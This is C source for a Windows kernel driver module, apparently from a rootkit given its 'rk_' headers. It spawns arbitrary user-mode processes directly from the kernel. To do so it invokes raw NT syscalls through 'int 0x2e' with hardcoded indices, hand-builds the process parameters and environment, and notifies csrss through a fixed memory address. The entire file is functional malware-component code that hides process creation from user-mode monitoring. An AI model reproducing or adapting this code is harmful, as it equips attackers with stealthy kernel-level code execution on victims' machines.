#include "ntddk.h"
#include "ntdef.h"

#include "rk_utility.h"
#include "rk_driver.h"
#include "rk_process.h"
#include "rk_exec.h"



ULONG ZWOPEN_FILE_INDEX=0x4f;
ULONG ZWCREATE_SECTION_INDEX=0x21;
ULONG ZWCREATE_PROCESS_INDEX=0x1f;
ULONG ZWQUERY_SECTION_INDEX=0x77;
ULONG ZWALLOCATE_VIRTUAL_MEMORY_INDEX=0xa;
ULONG ZWPROTECT_VIRTUAL_MEMORY_INDEX=0x60;
ULONG ZWCREATE_THREAD_INDEX=0x24;
ULONG ZWQUERY_INFORMATION_PROCESS_INDEX=0x6d;
ULONG ZWRESUME_THREAD_INDEX=0x96;
ULONG ZWWRITE_VIRTUAL_MEMORY_INDEX=0xcb;
ULONG ZWREAD_VIRTUAL_MEMORY_INDEX=0x89;
ULONG ZWREQUEST_WAIT_REPLY_PORT_INDEX=0x93;

int execBody(PUNICODE_STRING ImageName);

// UTILS

NTSTATUS UtilsZwRoutine(ULONG  ZwIndex,...){

	NTSTATUS	status;

	_asm{
		Mov	EAX,[ZwIndex]
		Lea	EDX,[EBP+0xC]
		Int 0x2e
		Mov	[status],EAX
	}

	return status;
}



/// Exec related code...

// Clone of Ntdll::RtlCreateProcessParameters...
VOID RtlCreateProcessParameters(PPROCESS_PARAMETERS* pp,
								PUNICODE_STRING	ImageFile,
								PUNICODE_STRING	DllPath,
								PUNICODE_STRING	CurrentDirectory,
								PUNICODE_STRING	CommandLine,
								ULONG	CreationFlag,
								PUNICODE_STRING	WindowTitle,
								PUNICODE_STRING	Desktop,
								PUNICODE_STRING	Reserved,
								PUNICODE_STRING	Reserved2){

	PROCESS_PARAMETERS*	lpp;

	ULONG	Size=sizeof(PROCESS_PARAMETERS);
	if(ImageFile) Size+=ImageFile->MaximumLength;
	if(DllPath) Size+=DllPath->MaximumLength;
	if(CurrentDirectory) Size+=CurrentDirectory->MaximumLength;
	if(CommandLine) Size+=CommandLine->MaximumLength;
	if(WindowTitle) Size+=WindowTitle->MaximumLength;
	if(Desktop) Size+=Desktop->MaximumLength;
	if(Reserved) Size+=Reserved->MaximumLength;
	if(Reserved2) Size+=Reserved2->MaximumLength;

	//Allocate the buffer..
	*pp=ExAllocatePool(NonPagedPool,Size);
	lpp=*pp;
	RtlZeroMemory(lpp,Size);

	lpp->AllocationSize=PAGE_SIZE;
	lpp->Size=sizeof(PROCESS_PARAMETERS); // Unicode size will be added (if any)
	lpp->Flags=0;
	lpp->Reserved=0;
	lpp->Console=0;
	lpp->ProcessGroup=0;
	lpp->hStdInput=0;
	lpp->hStdOutput=0;
	lpp->hStdError=0;
	if(CurrentDirectory){
		lpp->CurrentDirectoryName.Length=CurrentDirectory->Length;
		lpp->CurrentDirectoryName.MaximumLength=CurrentDirectory->MaximumLength;
		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,CurrentDirectory->Buffer,CurrentDirectory->Length);
		lpp->CurrentDirectoryName.Buffer=(PWCHAR)lpp->Size;
		lpp->Size+=CurrentDirectory->MaximumLength;
	}
	lpp->CurrentDirectoryHandle=0;
	if(DllPath){
		lpp->DllPath.Length=DllPath->Length;
		lpp->DllPath.MaximumLength=DllPath->MaximumLength;
		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,DllPath->Buffer,DllPath->Length);
		lpp->DllPath.Buffer=(PWCHAR)lpp->Size;
		lpp->Size+=DllPath->MaximumLength;
	}
	if(ImageFile){
		lpp->ImageFile.Length=ImageFile->Length;
		lpp->ImageFile.MaximumLength=ImageFile->MaximumLength;
		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,ImageFile->Buffer,ImageFile->Length);
		lpp->ImageFile.Buffer=(PWCHAR)lpp->Size;
		lpp->Size+=ImageFile->MaximumLength;
	}
	if(CommandLine){
		lpp->CommandLine.Length=CommandLine->Length;
		lpp->CommandLine.MaximumLength=CommandLine->MaximumLength;
		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,CommandLine->Buffer,CommandLine->Length);
		lpp->CommandLine.Buffer=(PWCHAR)lpp->Size;
		lpp->Size+=CommandLine->MaximumLength;
	}
	lpp->Environment=0;
	lpp->dwX=0;
	lpp->dwY=0;
	lpp->dwXSize=0;
	lpp->dwYSize=0;
	lpp->dwXCountChars=0;
	lpp->dwYCountChars=0;
	lpp->dwFillAttribute=0;
	lpp->dwFlags=0;
	lpp->wShowWindow=0;
	if(WindowTitle){
		lpp->WindowTitle.Length=WindowTitle->Length;
		lpp->WindowTitle.MaximumLength=WindowTitle->MaximumLength;
		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,WindowTitle->Buffer,WindowTitle->Length);
		lpp->WindowTitle.Buffer=(PWCHAR)lpp->Size;
		lpp->Size+=WindowTitle->MaximumLength;
	}
	if(Desktop){
		lpp->Desktop.Length=Desktop->Length;
		lpp->Desktop.MaximumLength=Desktop->MaximumLength;
		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Desktop->Buffer,Desktop->Length);
		lpp->Desktop.Buffer=(PWCHAR)lpp->Size;
		lpp->Size+=Desktop->MaximumLength;
	}
	if(Reserved){
		lpp->Reserved2.Length=Reserved->Length;
		lpp->Reserved2.MaximumLength=Reserved->MaximumLength;
		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Reserved->Buffer,Reserved->Length);
		lpp->Reserved2.Buffer=(PWCHAR)lpp->Size;
		lpp->Size+=Reserved->MaximumLength;
	}
	if(Reserved2){
		lpp->Reserved3.Length=Reserved2->Length;
		lpp->Reserved3.MaximumLength=Reserved2->MaximumLength;
		RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Reserved2->Buffer,Reserved2->Length);
		lpp->Reserved3.Buffer=(PWCHAR)lpp->Size;
		lpp->Size+=Reserved2->MaximumLength;
	}
}

// Clone of user mode API, again....
// (May be changed if PEB or PROCESS_PARAMETER struct change !!!)
PWSTR	GetEnvironmentStrings(){
	PROCESS_BASIC_INFORMATION	pbi;
	PVOID						p;
	PWSTR						env;
	HANDLE						hCurProcess;

	//FIX ME!! No power for making code to check env block length :)) 
	ULONG						envSize=PAGE_SIZE;


	p=PsGetCurrentProcess();
	
	ObOpenObjectByPointer(p,0,NULL,0,NULL,KernelMode,&hCurProcess);


	UtilsZwRoutine(ZWQUERY_INFORMATION_PROCESS_INDEX,hCurProcess,ProcessBasicInformation,
					&pbi,sizeof(pbi),0);  

	// Get pointer to current process, "process parameters"
	UtilsZwRoutine(ZWREAD_VIRTUAL_MEMORY_INDEX,hCurProcess,(PCHAR)pbi.PebBaseAddress+0x10,&p,sizeof(p),0);

	// Get pointer Environment block...
	UtilsZwRoutine(ZWREAD_VIRTUAL_MEMORY_INDEX,hCurProcess,(PCHAR)p+0x48,&p,sizeof(p),0);

	env=ExAllocatePool(NonPagedPool,envSize);

	// Get pointer Environment block...
	UtilsZwRoutine(ZWREAD_VIRTUAL_MEMORY_INDEX,hCurProcess,p,env,envSize,0);

	ZwClose(hCurProcess);

	return env;
}


PWSTR	CopyEnvironment(HANDLE	hProcess){

	PWSTR	env;
	ULONG	n;
	ULONG	m;
	PVOID	p=0;

	env=GetEnvironmentStrings();

	for(n=0;env[n]!=0;n+=wcslen(env+n)+1);
	n*=sizeof(*env);

	m=n;

	UtilsZwRoutine(ZWALLOCATE_VIRTUAL_MEMORY_INDEX,hProcess,&p,0,&m,
					MEM_COMMIT,PAGE_READWRITE);

	UtilsZwRoutine(ZWWRITE_VIRTUAL_MEMORY_INDEX,hProcess,p,env,n,0);

	return (PWSTR)p;
}

VOID CreateProcessParameters(HANDLE hProcess,PPEB Peb,PUNICODE_STRING ImageName,PUNICODE_STRING CmdLine){
		
	PPROCESS_PARAMETERS	pp;
	ULONG				n;
	PVOID				p=0;
	
	UNICODE_STRING		CurrentDirectory;				
	UNICODE_STRING		DllPath;				

	RtlInitUnicodeString(&CurrentDirectory,L"C:\\WINNT\\SYSTEM32\\");
	RtlInitUnicodeString(&DllPath,L"C:\\;C:\\WINNT\\;C:\\WINNT\\SYSTEM32\\");

	RtlCreateProcessParameters(&pp,ImageName,&DllPath,&CurrentDirectory,CmdLine,0,0,0,0,0);

	pp->Environment=CopyEnvironment(hProcess);
	
	n=pp->Size;

	UtilsZwRoutine(ZWALLOCATE_VIRTUAL_MEMORY_INDEX,hProcess,&p,0,&n,
					MEM_COMMIT,PAGE_READWRITE);

	UtilsZwRoutine(ZWWRITE_VIRTUAL_MEMORY_INDEX,hProcess,p,pp,pp->Size,0);

	UtilsZwRoutine(ZWWRITE_VIRTUAL_MEMORY_INDEX,hProcess,(PCHAR)Peb+0x10,&p,sizeof(p),0);

	// No way i will write a clone to destroy those !@#$@! parameters :))
	// Actually its only a Free()..
}

typedef struct _CSRMSG{
	PORT_MESSAGE	PortMessage;
	CSRSS_MESSAGE	CsrssMessage;
	PROCESS_INFORMATION	ProcessInformation;
	CLIENT_ID		Debuger;
	ULONG			CreationFlags;
	ULONG			VdmInfo[2];
}CSRMSG,*PCSRMSG;

// This code will be very ugly, and im not realy give a damn
VOID InformCsrss(HANDLE hProcess,HANDLE hThread,ULONG pid,ULONG tid){
	CSRMSG			csrmsg;
	HANDLE			hCurProcess;
	ULONG			handleIndex;
	PVOID			p;


	p=PsGetCurrentProcess();
	ObOpenObjectByPointer(p,0,NULL,0,NULL,KernelMode,&hCurProcess);

	// Get the index of the port handle, used to send messages to csrss.
	// FIX ME! find daynamic way to get this address.
	UtilsZwRoutine(ZWREAD_VIRTUAL_MEMORY_INDEX,hCurProcess,0x77fa8168,&handleIndex,sizeof(handleIndex),0);

	ZwClose(hCurProcess);


	RtlZeroMemory(&csrmsg,sizeof(CSRMSG));

	csrmsg.ProcessInformation.hProcess=hProcess;
	csrmsg.ProcessInformation.hThread=hThread;
	csrmsg.ProcessInformation.dwProcessId=pid;
	csrmsg.ProcessInformation.dwThreadId=tid;

	csrmsg.PortMessage.MessageSize=0x4c;
	csrmsg.PortMessage.DataSize=0x34;
	
	csrmsg.CsrssMessage.Opcode=0x10000;

	UtilsZwRoutine(ZWREQUEST_WAIT_REPLY_PORT_INDEX,handleIndex,&csrmsg,&csrmsg);
}



int exec(PUNICODE_STRING CmdLine){
	PPROCESS_CONTEXT_WORK_ITEM	pWorkItem;

	pWorkItem=CreateRunInProcessContextWorkItem(execBody,CmdLine);
	QueueWorkToRunInProcessContext(pWorkItem);

	WaitForWorkItem(pWorkItem);
}


int execBody(PUNICODE_STRING CmdLine){

	HANDLE	hProcess;
	HANDLE	hThread;
	HANDLE	hSection;
	HANDLE	hFile;

    OBJECT_ATTRIBUTES	oa;
	IO_STATUS_BLOCK		ioStatus;
	UNICODE_STRING		ImageName;

	SECTION_IMAGE_INFORMATION	sii;
	USER_STACK			stack={0};
	ULONG				n,x;
	PVOID				p;

	CONTEXT				context={CONTEXT_FULL};
	CLIENT_ID			cid;

	PROCESS_BASIC_INFORMATION	pbi;
	ULONG				i;


	ImageName.Length=CmdLine->Length;
	ImageName.MaximumLength=CmdLine->MaximumLength;
	ImageName.Buffer=CmdLine->Buffer;

	for(i=0;i<CmdLine->Length/2;i++){
		if((CmdLine->Buffer[i]==L' ') ||
			(CmdLine->Buffer[i]==L'\t')){
			ImageName.Length=i*2;
			break;
		}
	}

	InitializeObjectAttributes(&oa, &ImageName, OBJ_CASE_INSENSITIVE, 0, 0);


	UtilsZwRoutine(	ZWOPEN_FILE_INDEX,&hFile,FILE_EXECUTE | SYNCHRONIZE,
					&oa,&ioStatus,FILE_SHARE_READ,FILE_SYNCHRONOUS_IO_NONALERT);

	oa.ObjectName=0;

	UtilsZwRoutine( ZWCREATE_SECTION_INDEX,&hSection,SECTION_ALL_ACCESS,&oa,0,
					PAGE_EXECUTE,SEC_IMAGE,hFile);

	ZwClose(hFile);


	UtilsZwRoutine(ZWCREATE_PROCESS_INDEX,&hProcess,PROCESS_ALL_ACCESS,&oa,0xffffffff,FALSE,
					hSection,0,0);

	UtilsZwRoutine(ZWQUERY_SECTION_INDEX,hSection,SectionImageInformation,
					&sii,sizeof(sii),0);

	ZwClose(hSection);

	n=sii.StackReserve;
	UtilsZwRoutine(ZWALLOCATE_VIRTUAL_MEMORY_INDEX,hProcess,&stack.ExpandableStackBottom,0,&n,
					MEM_RESERVE,PAGE_READWRITE);

	stack.ExpandableStackBase=(PCHAR)(stack.ExpandableStackBottom)+sii.StackReserve;
	stack.ExpandableStackLimit=(PCHAR)(stack.ExpandableStackBase)-sii.StackCommit;

	n=sii.StackCommit+PAGE_SIZE;
	p=(PCHAR)(stack.ExpandableStackBase)-n;

	UtilsZwRoutine(ZWALLOCATE_VIRTUAL_MEMORY_INDEX,hProcess,&p,0,&n,
					MEM_COMMIT,PAGE_READWRITE);

	n=PAGE_SIZE;

	UtilsZwRoutine(ZWPROTECT_VIRTUAL_MEMORY_INDEX,hProcess,&p,&n,
					PAGE_READWRITE | PAGE_GUARD,&x);

	
	context.SegGs=0;
	context.SegFs=0x38;
	context.SegEs=0x20;
	context.SegDs=0x20;
	context.SegSs=0x20;
	context.SegCs=0x18;
	context.EFlags=0x3000;
	context.Esp=(ULONG)(stack.ExpandableStackBase)-4;
	context.Eip=(ULONG)(sii.EntryPoint);

			
	UtilsZwRoutine(ZWCREATE_THREAD_INDEX,&hThread,THREAD_ALL_ACCESS,&oa,
					hProcess,&cid,&context,&stack,TRUE);


	UtilsZwRoutine(ZWQUERY_INFORMATION_PROCESS_INDEX,hProcess,ProcessBasicInformation,
					&pbi,sizeof(pbi),0);

	CreateProcessParameters(hProcess,pbi.PebBaseAddress,&ImageName,CmdLine);


	InformCsrss(hProcess,hThread,(ULONG)(cid.UniqueProcess),(ULONG)(cid.UniqueThread));


	UtilsZwRoutine(ZWRESUME_THREAD_INDEX,hThread,0);

	ZwClose(hProcess);
	ZwClose(hThread);

	return (int)(cid.UniqueProcess);
}